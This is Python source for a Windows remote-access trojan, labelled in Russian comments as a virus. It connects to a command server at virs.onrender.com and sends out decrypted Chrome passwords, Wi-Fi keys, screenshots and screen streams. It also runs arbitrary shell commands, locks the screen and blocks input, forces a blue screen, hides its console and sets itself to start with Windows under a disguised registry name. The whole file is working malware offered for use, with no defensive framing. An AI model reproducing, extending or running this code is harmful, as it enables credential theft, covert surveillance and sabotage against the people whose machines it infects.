# =====================================================================
# ВИРУС - СТАБИЛЬНАЯ ВЕРСИЯ С ПЕРЕПОДКЛЮЧЕНИЕМ
# Сохранить как virus.py
# =====================================================================
import json
import os
import sys
import subprocess
import sqlite3
import shutil
import base64
import ctypes
import time
import platform
import io
import threading
import requests

def install_deps():
    deps = ["pywin32", "pycryptodome", "pillow", "mss", "psutil"]
    for dep in deps:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "--quiet"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

install_deps()

import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab, Image
import mss

SERVER_IP = "https://virs.onrender.com"

class Trojan:
    def __init__(self):
        self.session_id = None
        self.connected = False
        
    def register(self):
        try:
            r = requests.post(f"{SERVER_IP}/register", json={
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os": f"{platform.system()} {platform.release()}"
            }, timeout=15)
            
            if r.status_code == 200:
                self.session_id = r.json().get("id")
                self.connected = True
                return True
        except:
            pass
        return False
    
    def send_json(self, data):
        try:
            requests.post(f"{SERVER_IP}/data/{self.session_id}", json=data, timeout=10)
        except:
            pass
    
    def take_screenshot(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img = img.resize((800, 450), Image.LANCZOS)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=30)
                return base64.b64encode(buf.getvalue()).decode()
        except:
            try:
                img = ImageGrab.grab()
                img = img.resize((800, 450), Image.LANCZOS)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=30)
                return base64.b64encode(buf.getvalue()).decode()
            except:
                return None
    
    def get_system_info(self):
        try:
            import psutil
            cpu = psutil.cpu_percent(interval=1)
            ram = psutil.virtual_memory()
            return {
                "hostname": platform.node(), "username": os.getlogin(),
                "os": f"{platform.system()} {platform.release()}",
                "cpu": f"{cpu}%", "ram_total": f"{ram.total // (1024**3)} GB"
            }
        except:
            return {"hostname": platform.node(), "username": os.getlogin()}
    
    def steal_chrome(self):
        try:
            local_state_path = os.path.join(os.environ["USERPROFILE"], 
                "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            if not os.path.exists(local_state_path):
                return "Chrome not found"
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            user_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
            profiles = ["Default"] + [d for d in os.listdir(user_data) if d.startswith("Profile")]
            
            all_passwords = []
            for profile in profiles:
                db_path = os.path.join(user_data, profile, "Login Data")
                if not os.path.exists(db_path):
                    continue
                
                temp_db = os.path.join(os.environ["TEMP"], f"chrome_{profile}.db")
                shutil.copyfile(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, enc_pwd in cursor.fetchall():
                    if enc_pwd:
                        try:
                            iv = enc_pwd[3:15]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted = cipher.decrypt(enc_pwd[15:])[:-16].decode()
                            all_passwords.append(f"{url} | {username} | {decrypted}")
                        except:
                            pass
                conn.close()
                os.remove(temp_db)
            return "\n".join(all_passwords) if all_passwords else "No passwords"
        except:
            return "Error"
    
    def steal_wifi(self):
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
            profiles = []
            for line in output.split('\n'):
                if "All User Profile" in line or "Все профили" in line:
                    profiles.append(line.split(":")[1].strip())
            
            wifi_data = []
            for profile in profiles:
                try:
                    details = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', 
                                                    shell=True, encoding='utf-8', errors='ignore')
                    for line in details.split('\n'):
                        if "Key Content" in line or "Ключ содержимого" in line:
                            wifi_data.append(f"{profile}: {line.split(':')[1].strip()}")
                except:
                    pass
            return "\n".join(wifi_data) if wifi_data else "No WiFi"
        except:
            return "Error"
    
    def execute_command(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, 
                                         timeout=30, encoding='utf-8', errors='ignore')
        except:
            return "Error"
    
    def winlocker(self):
        import tkinter as tk
        
        def lock():
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(bg='black')
            
            tk.Label(root, text="COMPUTER LOCKED\nPassword: 1234", 
                    fg='red', bg='black', font=('Arial', 30, 'bold')).pack(expand=True)
            
            pw = tk.StringVar()
            entry = tk.Entry(root, textvariable=pw, show='*', bg='#333', fg='#0f0', 
                           font=('Arial', 20), justify='center')
            entry.pack(pady=10)
            entry.focus()
            
            status = tk.Label(root, text="", fg='yellow', bg='black', font=('Arial', 14))
            status.pack()
            
            attempts = [3]
            
            def check(e=None):
                if pw.get() == "1234":
                    status.config(text="UNLOCKING...", fg='green')
                    root.after(500, root.destroy)
                else:
                    attempts[0] -= 1
                    pw.set("")
                    if attempts[0] <= 0:
                        os.system("shutdown /s /t 0")
                    else:
                        status.config(text=f"WRONG! {attempts[0]} left", fg='red')
            
            entry.bind('<Return>', check)
            tk.Button(root, text="UNLOCK", command=check, bg='red', fg='white').pack(pady=20)
            
            def block():
                while True:
                    try:
                        ctypes.windll.user32.BlockInput(True)
                    except:
                        pass
                    time.sleep(0.01)
            
            threading.Thread(target=block, daemon=True).start()
            root.mainloop()
        
        threading.Thread(target=lock, daemon=True).start()
    
    def run(self):
        while True:
            try:
                # Регистрируемся заново если disconnected
                if not self.connected:
                    if not self.register():
                        time.sleep(5)
                        continue
                
                # Ждём команды
                r = requests.get(f"{SERVER_IP}/command/{self.session_id}", timeout=35)
                
                if r.status_code == 200:
                    cmd = r.json()
                    command = cmd.get("command")
                    
                    if command == "screenshot":
                        img = self.take_screenshot()
                        if img:
                            self.send_json({"type": "screenshot", "data": img})
                    
                    elif command == "stream_start":
                        # Отправляем скриншоты в цикле
                        for _ in range(50):
                            img = self.take_screenshot()
                            if img:
                                self.send_json({"type": "stream_frame", "data": img})
                            time.sleep(0.5)
                    
                    elif command == "sysinfo":
                        self.send_json({"type": "sysinfo", "data": self.get_system_info()})
                    
                    elif command == "steal_chrome":
                        self.send_json({"type": "chrome_passwords", "data": self.steal_chrome()})
                    
                    elif command == "steal_wifi":
                        self.send_json({"type": "wifi_passwords", "data": self.steal_wifi()})
                    
                    elif command == "exec":
                        self.send_json({"type": "exec_result", "data": self.execute_command(cmd.get("cmd", ""))})
                    
                    elif command == "lock":
                        ctypes.windll.user32.BlockInput(True)
                        self.send_json({"type": "message", "data": "Locked"})
                    
                    elif command == "unlock":
                        ctypes.windll.user32.BlockInput(False)
                        self.send_json({"type": "message", "data": "Unlocked"})
                    
                    elif command == "winlocker":
                        self.winlocker()
                        self.send_json({"type": "message", "data": "Winlocker activated"})
                    
                    elif command == "shutdown":
                        os.system("shutdown /s /t 3")
                    
                    elif command == "restart":
                        os.system("shutdown /r /t 3")
                    
                    elif command == "bsod":
                        try:
                            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
                        except:
                            pass
                    
                    elif command == "message":
                        ctypes.windll.user32.MessageBoxW(0, cmd.get("text", ""), "System", 0x40)
                        self.send_json({"type": "message", "data": "Message shown"})
                    
                    elif command == "send_media":
                        try:
                            ext = {"image": ".png", "video": ".mp4", "audio": ".mp3"}.get(cmd.get("file_type", ""), ".tmp")
                            filepath = os.path.join(os.environ["TEMP"], f"media_{int(time.time())}{ext}")
                            with open(filepath, "wb") as f:
                                f.write(base64.b64decode(cmd.get("data", "")))
                            os.startfile(filepath)
                        except:
                            pass
                
                elif r.status_code != 200:
                    self.connected = False
                    self.session_id = None
                    
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                self.connected = False
                self.session_id = None
                time.sleep(5)
            except Exception as e:
                time.sleep(3)

if __name__ == "__main__":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsHostProcess", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass
    
    Trojan().run()
